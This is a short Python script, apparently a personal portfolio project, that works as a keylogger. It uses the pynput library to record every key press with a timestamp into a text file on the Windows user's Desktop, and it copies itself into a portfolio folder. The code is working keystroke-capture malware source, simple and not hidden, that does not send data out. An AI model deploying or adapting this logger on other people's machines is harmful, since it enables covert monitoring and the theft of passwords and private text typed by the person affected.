import logging
import os
from shutil import copyfile
from pynput.keyboard import Listener

username = os.getlogin();
logging_directory = f"C:/Users/{username}/Desktop"

if not os.path.exists(logging_directory):
    os.makedirs(logging_directory)

copyfile('keylogger.py', f'C:/Users/{username}/Documents/projetos_pessoais_portifolio/keylogger.py')

logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG,format='%(asctime)s: %(message)s')

def key_handler(key):
    logging.info(str(key))

with Listener(on_press=key_handler) as Listener:
    Listener.join()